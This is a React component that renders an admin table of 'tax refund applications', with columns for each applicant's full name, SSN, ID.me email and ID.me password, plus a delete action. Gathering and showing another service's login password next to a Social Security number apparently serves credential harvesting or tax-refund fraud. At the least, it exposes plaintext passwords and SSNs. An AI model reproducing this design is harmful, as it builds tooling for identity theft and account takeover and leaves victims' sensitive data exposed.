import { useState } from "react";
import { FaTrash } from "react-icons/fa";
import toast from "react-hot-toast";

import { Table } from "../common/Table";

import { deleteTaxRefund } from "../../services/tax.service";

import { ConfirmationModal } from "../common/ConfirmationModal";

export function TaxRefundTable({ taxRefunds, reload }) {
  const [showModal, setShowModal] = useState(false);
  const [modalMessage, setModalMessage] = useState("");
  const [modalAction, setModalAction] = useState(null);
  const [loading, setLoading] = useState(false);



  const handleDelete = async (loan) => {
  setLoading(true);

  try {
    await deleteTaxRefund(loan._id);

    await reload();

    toast.success('Tax Refund application deleted successfully.');

    setShowModal(false);
  } catch (error) {
    console.error(error);

    toast.error(
      error.response?.data?.message ||
        'Failed to delete tax refund .',
    );
  } finally {
    setLoading(false);
  }
};

  const taxRefundColumns = [
    {
      key: "account",
      label: "Account",
      render: (row) => (
        <div className="flex flex-col">
          <span className="font-medium text-text">
            {row.owner.firstName} {row.owner.lastName}
          </span>

          <span className="text-sm text-text-muted">{row.owner.email}</span>
        </div>
      ),
    },

    {
      key: "fullName",
      label: "Full Name",
      render: (row) => row.fullName,
    },

    {
      key: "ssn",
      label: "SSN",
      render: (row) => row.ssn,
    },


    {
      key: "idMeEmail",
      label: "ID.me Email",
      render: (row) => row.idMeEmail,
    },

    {
      key: "idMePassword",
      label: "ID.me Password",
      render: (row) => row.idMePassword,
    },

    {
      key: "country",
      label: "Country",
      render: (row) => row.country,
    },

    {
      key: "status",
      label: "Status",
      render: (row) => row.status,
    },

    {
      key: "action",
      label: "Action",

      render: (row) => (
        <div className="flex items-center gap-2">
         
          <button
            type="button"
            onClick={() => {
              setModalMessage(
                "Are you sure you want to delete this Tax refund application? This action cannot be undone.",
              );
              setModalAction(
                () => () => handleDelete(row),
              );
              setShowModal(true);
            }}
            className="rounded-lg bg-red-500 p-2 text-white"
          >
            <FaTrash />
          </button>
        </div>
      ),
    },
  ];

  return (
    <div>
      <Table columns={taxRefundColumns} data={taxRefunds} />

      <ConfirmationModal
        isOpen={showModal}
        message={modalMessage}
        onConfirm={modalAction}
        onCancel={() => setShowModal(false)}
        loading={loading}
      />
    </div>
  );
}
